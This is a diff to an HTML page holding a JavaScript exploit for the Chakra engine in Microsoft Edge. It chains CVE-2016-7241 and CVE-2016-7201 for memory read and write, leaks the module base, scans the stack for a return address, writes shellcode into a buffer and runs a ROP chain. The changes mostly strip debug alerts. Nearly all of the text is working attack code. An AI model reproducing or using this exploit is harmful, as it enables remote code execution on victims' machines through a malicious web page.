@@ -4,7 +4,6 @@
     </head>
 <body>
 <script>
-
 var Long = dcodeIO.Long;
 var dv;
 var fdv = new DataView(new ArrayBuffer(8));
@@ -13,33 +12,20 @@ var x = (new Array(56, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)).slice();
 
 var [hi, lo] = getAddress(x);
 
-
-var finAddr = new Long(lo, hi, true);
-//alert(finAddr.toString(16));
-
 [hi, lo] = [hi|0, (lo + 0x58)|0];   // offset (0x58) to the array data slots
-//alert("triggering");
-finAddr = new Long(lo, hi, true);
-//alert(finAddr.toString(16));
+
 TriggerFillFromPrototypesBug(lo, hi);
-finAddr = new Long(lo, hi, true);
-//alert(finAddr.toString(16));
-//alert("reading vtable");
+
 var vtable = Read64(new Long(lo - 0x58, hi, true));
-//alert("vtable: 0x" + vtable.toString(16));
+
 var chakraBase = Read64(vtable).sub(0x2F920);
-//alert("chakraBase: 0x" + chakraBase.toString(16));
-//var chakraHeader = Read64(chakraBase);
-//alert("PE header: 0x" + chakraHeader.toString(16));
 
 var threadCtxPtr = Read64(chakraBase.add(0x6FCD10)); // class ThreadContext * ThreadContext::globalListLast
-alert("threadCtxPtr: 0x" + threadCtxPtr.toString(16));
+
 var stackLimit = Read64(threadCtxPtr.add(0x388));
-alert("stackLimit: 0x" + stackLimit.toString(16));
 
 var stack = stackLimit.sub(0xC000).add(2*1024*1024);   // 2 MB thread stack
 var retPtr = chakraBase.add(0x04AEAD);   // Inside ScriptEngine::ExecutePendingScripts (after a call to Execute)
-//alert("ScriptEngine::ExecutePendingScripts: 0x" + retPtr.toString(16));
 
 var retPtrAddr;
 for (var i = 8; i < 32 * 1024; i += 8)
@@ -51,10 +37,9 @@ for (var i = 8; i < 32 * 1024; i += 8)
         break;
     }
 }
-alert("retPtrAddr: 0x" + retPtrAddr.toString(16));
 var retCodeAddr = Read64(retPtrAddr);
-alert("retCodeAddr: 0x" + retCodeAddr.toString(16));
 
+// shellcode size
 var shellLen = 0x1000;
 // create shell code
 var z = new Uint8Array([
@@ -68,26 +53,19 @@ var scU32 = new Uint32Array(z.buffer);
 
 var realShellCode = (new Array(shellLen)).slice();
 
-alert("realShellCode: 0x" + getAddressLong(realShellCode).toString(16));
-var [shi, slo] = getAddress(realShellCode);
-//var shcodeAddr = Read64((new Long(slo|0, shi|0, true).add(0x20)));  // offset (0x20) to the pointer to the buffer
+var shellcAddr = getAddressLong(realShellCode);
+alert("shell code address: 0x" + shellcAddr.toString(16));
 
-var shcodeAddr = Read64((new Long(slo|0, shi|0, true).add(0x28)));  // offset (0x28) to the pointer to the buffer
+var shcodeAddr = Read64(shellcAddr.add(0x28));  // offset (0x28) to the pointer to the buffer
 shcodeAddr = shcodeAddr.add(8); // advance to start of buff
-//alert("shcodeAddr: 0x" + shcodeAddr.toString(16));
-
-alert("shcodeAddr (before write): 0x" + shcodeAddr.toString(16));
 
 var origScAddr = shcodeAddr;
-alert("Copying shellcode");
+
 for(var i = 0; i < scU32.length;i+=2)
 {
-    Write64(shcodeAddr, new Long(scU32[i], scU32[i+1], true));
-
-    shcodeAddr = shcodeAddr.add(8);
+    Write64(shcodeAddr.add(i * 4), new Long(scU32[i], scU32[i+1], true));
 }
 shcodeAddr = origScAddr;
-alert("shcodeAddr (after write): 0x" + shcodeAddr.toString(16));
 
 var filler = new Long(0, 0, true);
 
@@ -145,7 +123,7 @@ for (var i = 0; i < rop.length; ++i)
 
 alert("Exploit done!");
 
-// (CVE-2016-7241)
+/*(CVE-2016-7241) */
 function getAddress(y)
 {
     var b = false;
@@ -178,7 +156,7 @@ function getAddressLong(y)
     JSON.parse("[1, 2]", f);
     return new Long(a[0], a[1], true);
 }
-/* Using FillFromPrototypes bug (CVE-2016-7201) */
+/*(CVE-2016-7201) */
 function TriggerFillFromPrototypesBug(lo, hi)
 {
     // Type* (which has TypeId)
